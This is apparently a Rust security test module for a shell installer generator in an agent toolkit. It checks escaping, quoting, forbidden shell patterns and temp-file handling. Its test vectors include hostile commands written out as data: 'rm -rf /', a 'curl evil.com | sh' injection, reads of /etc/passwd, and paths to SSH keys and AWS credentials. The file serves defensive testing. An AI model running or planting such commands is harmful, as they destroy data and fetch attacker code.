#[cfg(test)]
mod security_tests {
    use std::process::Command;

    // Test vectors for command injection attempts
    const MALICIOUS_INPUTS: &[&str] = &[
        // Command substitution attempts
        "$(rm -rf /)",
        "`cat /etc/passwd`",
        "${PATH:+${PATH}:}/../../etc/passwd",
        // Quote escaping
        "'; curl evil.com | sh; echo '",
        "\"; curl evil.com | sh; echo \"",
        // Path traversal
        "../../../etc/passwd",
        "/tmp/../../etc/passwd",
        // Special characters
        "\0\n\r\t",
        "!@#$%^&*(){}[]|\\:;\"'<>?,./",
        // Environment variable injection
        "$HOME/.ssh/id_rsa",
        "${HOME}/.aws/credentials",
        // Subshell attempts
        "$(echo hello)",
        "`echo hello`",
        "$((1+1))",
        // Glob expansion
        "*",
        "?",
        "[a-z]*",
        // Process substitution
        "<(cat /etc/passwd)",
        ">(cat > /tmp/evil)",
        // Here document injection
        "<<EOF\nrm -rf /\nEOF",
        // Null byte injection
        "file\0.txt",
        // Unicode tricks
        "file\u{202e}.txt", // Right-to-left override
    ];

    fn generate_installer_with_args(args: Vec<String>) -> String {
        // This simulates generating the installer with specific arguments
        // In real implementation, this would use the actual macro
        let output = Command::new("cargo")
            .args([
                "run",
                "--features",
                "installer-gen",
                "--bin",
                "generate-installer",
            ])
            .env("TEST_ARGS", args.join("\n"))
            .output()
            .expect("Failed to generate installer");

        String::from_utf8_lossy(&output.stdout).to_string()
    }

    #[test]
    #[ignore = "Requires full MIR lowering implementation"]
    fn test_command_injection_prevention() {
        for input in MALICIOUS_INPUTS {
            let shell = generate_installer_with_args(vec![input.to_string()]);

            // Verify no unescaped input appears in shell
            assert!(
                !shell.contains(input) || shell.contains(&shell_escape(input)),
                "Unescaped input found: {}",
                input
            );

            // Verify dangerous patterns are not present
            assert!(!shell.contains("eval "), "eval found in generated shell");
            assert!(
                !shell.contains("source "),
                "source found in generated shell"
            );
            assert!(
                !shell.contains(". "),
                "dot sourcing found in generated shell"
            );
        }
    }

    #[test]
    fn test_shellcheck_security_audit() {
        // Only run if shellcheck is available
        if Command::new("which")
            .arg("shellcheck")
            .output()
            .map(|o| o.status.success())
            .unwrap_or(false)
        {
            for input in MALICIOUS_INPUTS {
                let shell = generate_installer_with_args(vec![input.to_string()]);

                let mut child = Command::new("shellcheck")
                    .args(["-s", "sh", "-e", "SC2086,SC2089,SC2090", "-"])
                    .stdin(std::process::Stdio::piped())
                    .stdout(std::process::Stdio::piped())
                    .stderr(std::process::Stdio::piped())
                    .spawn()
                    .unwrap();

                use std::io::Write;
                if let Some(mut stdin) = child.stdin.take() {
                    stdin.write_all(shell.as_bytes()).unwrap();
                }

                let output = child.wait_with_output().unwrap();
                assert!(
                    output.status.success(),
                    "Security vulnerability detected for input '{}': {}",
                    input,
                    String::from_utf8_lossy(&output.stderr)
                );
            }
        }
    }

    #[test]
    fn test_no_dynamic_evaluation() {
        let shell = generate_installer_with_args(vec!["normal_arg".to_string()]);

        // These patterns should never appear
        let forbidden_patterns = [
            "eval ", "source ", ". ", "exec ", "${!",    // Indirect expansion
            "<<<",    // Here string
            "coproc", // Coprocess
        ];

        for pattern in &forbidden_patterns {
            assert!(
                !shell.contains(pattern),
                "Forbidden pattern '{}' found in generated shell",
                pattern
            );
        }
    }

    #[test]
    #[ignore = "Requires full MIR lowering implementation"]
    fn test_proper_quoting() {
        let shell = generate_installer_with_args(vec!["test arg".to_string()]);

        // Verify all variable expansions are quoted
        let lines: Vec<&str> = shell.lines().collect();
        for line in lines {
            if line.trim().starts_with('#') {
                continue;
            }

            // Check for unquoted variable expansions
            if line.contains("$") && !line.contains("\"$") && !line.contains("'$") {
                // Special cases that are allowed
                let allowed = [
                    "case $", // Case statements
                    "[ $",    // Test conditions (should still be quoted though)
                    "exit $", // Exit codes
                ];

                if !allowed.iter().any(|&pattern| line.contains(pattern)) {
                    panic!("Unquoted variable expansion found: {}", line);
                }
            }
        }
    }

    #[test]
    fn test_long_string_handling() {
        // Test with a very long string
        let long_string = "A".repeat(10000);
        let shell = generate_installer_with_args(vec![long_string.clone()]);

        // Should handle long strings safely
        assert!(
            shell.len() < 100000,
            "Shell script too large for long input"
        );
    }

    #[test]
    fn test_path_sanitization() {
        let malicious_paths = vec![
            "../../../etc/passwd",
            "/tmp/../etc/passwd",
            "./../../sensitive",
            "~/../other_user",
        ];

        for path in malicious_paths {
            let shell = generate_installer_with_args(vec![path.to_string()]);

            // Should not contain relative path components
            assert!(
                !shell.contains("../"),
                "Relative path traversal found for input: {}",
                path
            );
        }
    }

    #[test]
    #[ignore = "Requires full MIR lowering implementation"]
    fn test_safe_temp_file_handling() {
        let shell = generate_installer_with_args(vec!["test".to_string()]);

        // Verify mktemp is used for temporary files
        assert!(shell.contains("mktemp"), "mktemp not used for temp files");

        // Verify cleanup trap is set
        assert!(shell.contains("trap"), "No cleanup trap found");
        assert!(
            shell.contains("EXIT") || shell.contains("ERR"),
            "Trap not set for EXIT/ERR"
        );
    }

    fn shell_escape(s: &str) -> String {
        s.chars()
            .map(|c| match c {
                '"' => "\\\"".to_string(),
                '\\' => "\\\\".to_string(),
                '$' => "\\$".to_string(),
                '`' => "\\`".to_string(),
                '\n' => "\\n".to_string(),
                '\r' => "\\r".to_string(),
                '\t' => "\\t".to_string(),
                c if c.is_control() => format!("\\x{:02x}", c as u8),
                c => c.to_string(),
            })
            .collect()
    }
}

#[cfg(all(test, feature = "installer-gen"))]
mod installer_gen_security_tests {
    use paiml_mcp_agent_toolkit::installer::INSTALL_PAIML_MCP_AGENT_TOOLKIT_SHELL;

    #[test]
    fn test_generated_installer_security_headers() {
        // Verify security headers are present
        assert!(INSTALL_PAIML_MCP_AGENT_TOOLKIT_SHELL.contains("set -euf"));
        assert!(INSTALL_PAIML_MCP_AGENT_TOOLKIT_SHELL.contains("#!/bin/sh"));

        // Verify no bashisms (should be pure POSIX)
        assert!(!INSTALL_PAIML_MCP_AGENT_TOOLKIT_SHELL.contains("[["));
        assert!(!INSTALL_PAIML_MCP_AGENT_TOOLKIT_SHELL.contains("]]"));
        assert!(!INSTALL_PAIML_MCP_AGENT_TOOLKIT_SHELL.contains("function "));
        assert!(!INSTALL_PAIML_MCP_AGENT_TOOLKIT_SHELL.contains("source "));
        assert!(!INSTALL_PAIML_MCP_AGENT_TOOLKIT_SHELL.contains("<<<"));
    }
}
